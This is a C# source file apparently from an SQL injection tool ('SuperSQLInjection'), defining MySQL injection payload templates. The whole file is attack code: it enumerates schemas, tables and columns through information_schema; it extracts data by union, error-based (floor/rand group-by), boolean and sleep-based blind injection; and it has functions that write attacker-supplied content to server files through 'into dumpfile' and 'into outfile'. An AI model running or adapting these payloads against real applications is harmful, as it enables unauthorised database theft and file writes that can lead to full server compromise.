using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class MySQL5
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/mysql5/ver.txt";
        public static List<String> vers = FileTool.readFileToList(path);

        public static String char_length = "(select char_length({data}))";
        
        //数据库数量
        public static String dbs_count = "(select count(*) from information_schema.schemata)";
        //表数量
        public static String tables_count = "(select count(*) from information_schema.tables where table_schema='{dbname}')";
        //列数量
        public static String columns_count = "(select count(*) from information_schema.columns where table_schema='{dbname}' and table_name='{table}')";


        //获取数据库名
        public static String db_value = "(select schema_name from information_schema.schemata limit {index},1)";
        //获取表名称
        public static String table_value = "(select table_name from information_schema.tables where table_schema='{dbname}' limit {index},1)";
        //获取列名称
        public static String column_value = "(select column_name from information_schema.columns where table_schema='{dbname}' and table_name='{table}' limit {index},1)";



        public static String bool_length = "char_length({data})";
        public static String bool_value = "ascii(mid({data},{index},1))";
        public static String mid_value = "(mid({data},{index},1))";

        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";

        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";
        

        //多字符长度判断
        //public static String mu_value = "(hex(convert((mid({data},{index},1)) using UTF8)))";
        
        //多字符处理判断
        public static String ord_value = "(ord(mid({data},{index},1)))";

        //bool方式字符长度判断
        public static String ver_length = " "+ bool_length + ">{len}";

        //bool方式字符长度判断
        public static String char_len= "char_length({data})";

        //bool方式获取值
        public static String ver_value = " "+ bool_value + ">{len}";

        //bool方式获取值
        public static String bool_ord_value = " " + mid_value + ">{len}";

        //获取行数据bool
        public static String data_value = "(select {columns} from {dbname}.{table} limit {limit},1)";

       

        //union获取数据条数
        public static String data_count = "(select count(*) from {dbname}.{table})";
        //bool判断数据条数
        public static String bool_datas_count = " " + data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data}";

        //error方式
        public static String error_value = " (select 1 from (select count(*),concat(({data}),floor(rand(0)*2))x from information_schema.tables group by x)a)";
        
        public static String hex = "(select hex({data}))";
        public static String hex_value = "(select hex(convert(({data}) using UTF8)))";

        public static String substr_value = "(select substr({data},{start},{len}))";
        public static String getBoolCountBySleep(String data,int maxTime)
        {    
            return " (select * from (select(sleep("+ maxTime + "-(if(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
        }

        /// <summary>
        /// 生成联合查询的列的字符串，如1,2,3,用于union注入
        /// </summary>
        /// <param name="columnsLen">列长度</param>
        /// <param name="showIndex">显示列是第几列</param>
        /// <param name="fill">其他列填充字符</param>
        /// <param name="columns">填充显示列的对应列集合数据</param>
        /// <param name="table">表明</param>
        /// <param name="dbName">数据库名</param>
        /// <param name="dbName">limit下标,没有填写-1</param>
        /// <returns></returns>
        public static String creatMySQLColumnsStrByUnion(int columnsLen, int showIndex, String fill, List<String> columns, String table, String dbName, int limit)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {

                if (i == showIndex)
                {
                    sb.Append(creatMySQLColumnStr(columns) + ",");
                }
                else
                {

                    sb.Append(fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1).ToString();

            if (!Tools.checkEmpty(dbName))
            {
                sb.Append(" from " + dbName + ".");
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(table);
                }

            }
            else
            {
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(" from " + table);
                }
            }
            if (limit >= 0)
            {
                sb.Append(" limit " + limit + ",1");

            }
            return sb.ToString();
        }

        public static String creatMySQLReadFileByUnion(int columnsLen, int showIndex,String fill,String data)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {

                if (i == showIndex)
                {
                    sb.Append(creatMySQLColumnStr(data) + ",");
                }
                else
                {

                    sb.Append(fill+",");
                }
            }
            return sb.Remove(sb.Length - 1, 1).ToString();
        }

        public static String creatMySQLWriteFileByUnion(int columnsLen, int dataIndex,String fill, String path,String content)
        {
            StringBuilder sb = new StringBuilder(" 1=1 union select ");
            for (int i = 1; i <= columnsLen; i++)
            {

                if (i == dataIndex)
                {
                    sb.Append(Tools.strToHex(content,"UTF-8")+",");
                }
                else
                {

                    sb.Append(fill+",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            sb.Append(" into dumpfile '"+path+"'");
            return sb.ToString();
        }

        public static String creatMySQLWriteFileByUnionByMuSQL(String path, String content)
        {
            return ";select " + Tools.strToHex(content,"UTF-8") + " into outfile '" + path + "'";
        }

        public static String creatMySQLColumnsStrByError(List<String> columns, String table, String dbName, int limit)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(creatMySQLColumnStr(columns));

            if (!Tools.checkEmpty(dbName))
            {
                sb.Append(" from " + dbName + ".");
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(table);
                }
            }
            else
            {
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(" from " + table);
                }
            }
            if (limit >= 0)
            {
                sb.Append(" limit " + limit + ",1");

            }
            return sb.ToString();
        }


        public static String creatMySQLColumnsStrByError(String column, String table, String dbName, int limit)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(creatMySQLColumnStr(column));

            if (!Tools.checkEmpty(dbName))
            {
                sb.Append(" from " + dbName + ".");
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(table);
                }
            }
            else
            {
                if (!Tools.checkEmpty(table))
                {
                    sb.Append(" from " + table);
                }
            }
            if (limit >= 0)
            {
                sb.Append(" limit " + limit + ",1");

            }
            return sb.ToString();
        }



        /// <summary>
        /// 生成查询列数据
        /// </summary>
        /// <param name="columns">列明</param>
        /// <returns></returns>
        public static String creatMySQLColumnStr(List<String> columns)
        {
            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
            for (int i = 0; i < columns.Count; i++)
            {
                if (columns.Count > 1)
                {
                    sb.Append("ifnull(cast(" + columns[i] + " as char),0x20),0x242424,");
                }
                else
                {
                    return creatMySQLColumnStr(columns[i]);
                }

            }

            if (columns.Count > 1)
            {
                sb.Remove(sb.Length - 9, 9);
            }
            sb.Append("0x215e5e)");
            return sb.ToString();

        }


        /// <summary>
        /// 生成查询列数据
        /// </summary>
        /// <param name="columns">列明</param>
        /// <returns></returns>
        public static String creatMySQLColumnStr(String column)
        {
            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
            sb.Append(column);
            sb.Append(",0x215e5e)");
            return sb.ToString();

        }

    }
}
